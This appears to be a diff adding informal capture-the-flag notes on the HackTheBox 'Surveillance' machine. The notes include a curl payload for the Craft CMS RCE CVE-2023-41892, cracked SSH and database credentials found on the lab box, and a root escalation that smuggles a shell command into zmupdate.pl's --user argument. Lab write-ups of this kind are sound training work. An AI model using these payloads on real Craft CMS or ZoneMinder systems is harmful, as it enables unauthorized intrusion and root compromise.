@@ -1,0 +1,66 @@
+The box just has a SSH and HTTP port
+inside the website the htaccess is downloadable and there is a login page
+
+The login and htaccess talk about something called Craft CMS
+Down inside the footer of the website with, digging it up we can find the
+version of craftcms.
+SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
+
+Version ==> Craft CMS 4.4.14
+
+Subdomain enumeration didnt find anything
+
+After trying to find a good exploit, we tried password reset hijacking BUT,
+there is a recent cve that works perfectly.
+
+CVE-2023-41892 - Craft CMS Remote Code Execution (RCE)
+
+curl -sk "http://surveillance.htb/index.php" -X POST -d 'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}' --proxy 127.0.0.1:8080
+
+https://github.com/zaenhaxor/CVE-2023-41892 --> source
+Converted a curl cmd shown inside a github repo so we can use it.
+The cmd in the repo simply runs phpinfo(), but with RCE we may be able to get us a shell!
+
+====== debugging the phpinfo payload =======
+https://github.com/guzzle/psr7
+https://pkp.sfu.ca/ojs/doxygen/master/html/FnStream_8php_source.html
+https://pkp.sfu.ca/ojs/doxygen/master/html/classGuzzleHttp_1_1Psr7_1_1FnStream.html#ab24256dde91f757958e246ed84b8e651
+============================================
+
+
+After getting a shell we have to dig around and find important items,
+a backup file seems to have a credential from a db.
+It was a simple MD5 hash.
+
+matthew:starcraft122490 ==> SSH Cred!
+=======================================================
+
+Inside of linpeas.out we can see db creds.
+'datasource' => 'Database/Mysql',
+'persistent' => false,
+'host' => 'localhost',
+'login' => 'zmuser',
+'password' => 'ZoneMinderPassword2023',
+'database' => 'zm'
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craftdb
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftCMSPassword2023!
+
+127.0.0.1:8080 ==> website? Or other service?
+
+admin:$2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.
+The hash doesnt crack, but with a password spray of known passwords matthew is
+also the admin user on zm.
+
+admin:starcraft122490
+
+ZM Version v1.36.32
+
+the `sudo /usr/bin/zmupdate.pl` command when you watch outputs is running a mysqldump, but the user and password are injectable to code breaks. We can add escapes to run our own bash code under root and gain a root shell!
+
+sudo /usr/bin/zmupdate.pl --version=1 --user='; bash /tmp/shell.sh; echo
+
